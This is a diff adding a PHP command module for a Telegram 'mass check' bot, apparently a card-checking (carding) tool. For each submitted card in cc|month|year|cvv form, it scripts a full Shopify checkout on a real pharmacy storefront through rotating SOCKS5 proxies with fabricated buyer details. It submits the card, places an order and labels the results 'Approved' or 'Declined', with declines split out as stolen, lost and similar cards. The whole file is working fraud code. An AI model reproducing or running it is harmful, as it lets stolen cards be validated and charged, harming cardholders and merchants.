@@ -1,0 +1,391 @@
+<?php
+
+list($cmd) = explode(" ", $message);
+if($cmd == "/mass5" or $cmd == ".mass5" or $cmd == "!mass5"){  
+$tiempo_inicial = microtime(true);
+    deleteprm($userId);
+    is_credits();
+    deltecred($userId);
+    is_gateroff('mass5');
+    unlink(getcwd().'/cookie.txt');
+    $Mi_Id = "5168647868";
+        $targetas = substr($message, 7);
+    if (empty($targetas)){
+                                                        bot('sendMessage', [
+                'chat_id' =>$chatId,
+    'reply_to_message_id'=>$message_id,
+    'parse_mode'=>'HTML',
+                'text' =>"<b>Mass Charged
+Format: <code>cc|m|y|cvv</code></b>"
+                ]);         die();
+    }
+    $bin = substr($targetas, 0,6);
+    $bines = bannedbin($bin);
+        if($bines == true){
+            reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
+            exit();
+        }
+$antispmatim = antispamCheck($userId);
+    if($antispmatim != False ){
+       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
+        exit();
+    }
+$antispmatim = antispamCheckperemium($userId);
+    if($antispmatim != False ){
+       reply_to($chatId,$message_id,$keyboard,"<b>[ANTI SPAM] Try again after $antispmatim</b><b>s</b>.");
+        exit();
+    }
+#Rango 
+$nui = infouser($userId);
+    $Rank = $nui['apodo'];
+if($gId == $Mi_Id){
+    $Rank = "Owner";
+    $GLOBALS['Rank'] = $Rank;
+}elseif($userId == verifiAdmin($userId)){
+    $Rank ="Admin";
+    $GLOBALS['Rank'] = $Rank;
+}elseif($userId == veritimepremium($userId)){
+   $Rank = $nui['apodo'];
+}elseif($chatId == verifiCharAdmin($chatId)){
+    $Rank = "Free User";
+    $GLOBALS['Rank'] = $Rank;
+}
+elseif($userId == verificadroCrdediuser($userId)){
+    $Rank ="Free user";
+    $GLOBALS['Rank'] =$Rank;
+}
+
+
+#fin 
+
+
+
+    $m1 = bot("sendmessage", [
+        "chat_id" => $chatId,
+        "text" => "<code>Your cc is being verified, wait a few seconds</code>",
+        "parse_mode" => "html",
+        "reply_to_message_id" => $message_id,
+    ]);
+
+    $ms1 = capture(json_encode($m1), '"message_id":', ",");
+
+    $targetas = cleansix($targetas);
+    $allcards = multiexplode(["\n", " "], $targetas);
+    //aki comienza el limite de ccs a checkar
+if (count($allcards) <= 6) {
+    $resultados = "";
+    $num = 0;
+    foreach ($allcards as $card) {
+        $num = ++$num;
+        $resultados .= "<b>Card: <code>$card</code> \n" . chkchg($card) . "</b>\n";
+    }
+
+    // Hacer una sola llamada a la API de Telegram para actualizar el mensaje
+    $tiempo_final = microtime(true);
+    $tiempo = $tiempo_final - $tiempo_inicial;
+    $tiempo = substr($tiempo, 0, 4);
+    $resultados .= "<b>－－－－－－－－－－－－－－－－
+Proxy  - 🝂 Live! ✅ 
+Time in Progress - 🝂 $tiempo s
+Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
+Bot by  - 🝂 Thkss
+－－－－－－－－－－－－－－－</b>";
+
+    // Actualizar el mensaje
+    bot("editMessageText", [
+        "chat_id" => $chatId,
+        "text" => $resultados,
+        "parse_mode" => "html",
+        "message_id" => $ms1,
+    ]);
+}
+ else {
+        bot("editMessageText", [
+            "chat_id" => $chatId,
+            "text" => "Error Maximo",
+            "parse_mode" => "html",
+            "message_id" => $ms1,
+        ]);
+        exit();
+    }
+}
+
+function chkchg($lista)
+{
+    global $userId;
+    $separa = explode("|", $lista);
+    $cc = $separa[0];
+    $mes = $separa[1];
+    $ano = $separa[2];
+    $cvv = $separa[3];
+    $cc = clean($cc);
+    $mes = clean($mes);
+    $ano = clean($ano);
+    
+
+
+$rotate = rotate();
+$socks5 = socks5();
+
+
+$first   = ucfirst(str_shuffle('ashley'));
+$last    = ucfirst(str_shuffle('tisdale'));
+$email    = "orankilback".substr(md5(uniqid()), 0, 5)."@gmail.com";
+$Idcooki = uniqid();
+
+// //================= [ CURL FIRST REQUIEST ] =================//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/cart/add.js');
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36';
+$headers[] = 'x-requested-with: XMLHttpRequest';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_type=product&utf8=%E2%9C%93&size=30+Count&potency=30mg&selling_plan_1150692=subsave&selling_plan=959086790&id=40473296928966&quantity=1');
+$curl = curl_exec($ch);
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/cart');
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'updates%5B%5D=1&checkout=');
+$curl = curl_exec($ch);
+$idpage = trim(strip_tags(getStr($curl, 'Shopify.Checkout.token = "', '"')));
+$authenticity_token = trim(strip_tags(getStr($curl, '<input type="hidden" name="_method" value="patch" autocomplete="off" /><input type="hidden" name="authenticity_token" value="', '"')));
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/10774315072/checkouts/'.$idpage.'');
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=abiyoe_fulle%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Abagail&checkout%5Bshipping_address%5D%5Blast_name%5D=Fadel&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=203+West+Washington+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Oswego&checkout%5Bshipping_address%5D%5Bcountry%5D=US&checkout%5Bshipping_address%5D%5Bprovince%5D=Illinois&checkout%5Bshipping_address%5D%5Bzip%5D=60543&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Abagail&checkout%5Bshipping_address%5D%5Blast_name%5D=Fadel&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=203+West+Washington+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Oswego&checkout%5Bshipping_address%5D%5Bprovince%5D=IL&checkout%5Bshipping_address%5D%5Bzip%5D=60543&checkout%5Bshipping_address%5D%5Bphone%5D=%28804%29+270-3457&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=748&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
+$curl = curl_exec($ch);
+$authenticity_token2 = trim(strip_tags(getStr($curl,'name="authenticity_token" value="','"')));
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/10774315072/checkouts/'.$idpage.'');
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token2).'&previous_step=shipping_method&step=payment_method&checkout%5Bdelivery_options%5D%5Bsubscription%5D%5Bgroup%5Btoken%5D%5D=7a227fd77982f9964fe74e9f1dcc924c&checkout%5Bdelivery_options%5D%5Bsubscription%5D%5Bgroup%5Btype%5D%5D=subscription&checkout%5Bdelivery_options%5D%5Bsubscription%5D%5Bid%5D=shopify-Standard%2520Shipping%2520-%2520Arrives%2520in%25203-7%2520Business%2520Days-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=748&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
+$curl = curl_exec($ch);
+$authenticity_token3 = trim(strip_tags(getStr($curl,'name="authenticity_token" value="','"')));
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+$Headers = ['Accept: application/json',
+'Content-Type: application/json',
+'Host: deposit.us.shopifycs.com',
+'Origin: https://checkout.shopifycs.com',
+'Referer: https://checkout.shopifycs.com/',
+'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'];
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"credit_card":{"number":"'.$cc.'","name":"Amelia Little","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.crislu.com"}');
+curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+$curl12 = curl_exec($ch);
+$id = trim(strip_tags(getStr($curl12,'"id":"','"')));
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/10774315072/checkouts/'.$idpage.'');
+curl_setopt($ch, CURLOPT_POST, 1);
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token3).'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=38612533301&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bsubscription_agreement%5D=0&checkout%5Bsubscription_agreement%5D=1&checkout%5Btotal_price%5D=4505&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=748&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
+$curl = curl_exec($ch);
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/10774315072/checkouts/' . $idpage . '/processing');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+$curl = curl_exec($ch);
+sleep(3);
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/10774315072/checkouts/' . $idpage . '/processing?from_processing_page=1');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+$curl = curl_exec($ch);
+sleep(3);
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.rrmeds.com/10774315072/checkouts/' . $idpage . '?from_processing_page=1&validate=true');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+$headers = array();
+$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+$headers[] = 'upgrade-insecure-requests: 1';
+$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie/'.$Idcooki.'.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie/'.$Idcooki.'.txt');
+$result2 = curl_exec($ch);
+$msg = trim(strip_tags(getstr($result2, '<p class="notice__text">','</p>')));
+
+
+if ((strpos($result2, 'CVV does not match')) || (strpos($result2, 'insufficient_funds'))){ 
+$status = "Approved!🟩";
+$response = "CVV does not match 🟩";
+restarCredito($userId);
+}elseif ((strpos($result2, "No Match")) || (strpos($result2, "incorrect_cvc"))){
+$status = "Approved!🟩";
+$response = "No Match #CNN🟩";
+restarCredito($userId);
+}elseif (strpos($result2, 'Your order is confirmed') || (strpos($result2,"Thank_you"))) {
+$status = "Approved!🟩";
+$response = 'Your order is confirmed($20)';
+restarCredito($userId);
+}
+elseif(strpos($result2, "Street address and postal code do not match. ")|| (strpos($result2,"Your card number is incorrect"))){ 
+$status = "Approved!🟩";
+$response = 'Street address and postal code do not match. #AVS';
+}elseif (strpos($result2, "tax_unresolved")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "tax_unresolved";
+}elseif (strpos($result2, "price_unconfirmed")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "INCORRECT NUMBER";
+}elseif (strpos($result2, "do_not_honor")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "do_not_honor";
+}elseif(strpos($result2, 'Success')){ 
+    $status = "Approved!🟩";
+    $response = "Approved!🟩";
+restarCredito($userId);
+
+}
+elseif (strpos($result2, "invalid_order_status")){ 
+$status = "[ DECLINED 🔴 ]";
+$response = "invalid_order_status";
+
+}elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
+    $status = "<b>CARD DECLINED ❌</b>";
+    $response = "Your card does not support this type of purchase🟥";
+}elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
+    $status = "<b>CARD DECLINED ❌</b>";
+    $response = "<b>LOST CARD</b>";
+  }
+  elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
+    $status = "<b>[ DECLINED 🔴 ]</b>";
+    $response = "<b>FRAUDULENT CARD</b>";
+  }elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
+    $status = "<b>CARD EXPIRED ❌</b>";
+    $response = "<b>EXPIRED CARD</b>";
+  }
+  elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'missing_order_stripe_params')) || (strpos($result2, 'incorrect_number'))){
+    $status = "<b>[ DECLINED 🔴 ]</b>";
+    $response = "<b>Card number is incorrect</b>";
+  }
+  elseif ((strpos($result2, 'invalid_account'))){
+$status = "<b>INVALID CARD ❌</b>";
+$response = "<b>invalid_account</b>";
+}elseif (empty($result2)){
+    $status = "<b>[ DECLINED 🔴 ]</b>";
+    $response = "<b>Error en Req</b>";
+    }elseif (strpos($result2, "generic_decline")){
+$status = "<b>[ DECLINED 🔴 ]</b>";
+$response = "<b>GENERIC DECLINE</b>";
+}else{
+$status = "[ DECLINED 🔴 ]";
+$response = "$msg ";
+   }
+
+    return "Response - 🝂 $status | $response";
+}
+
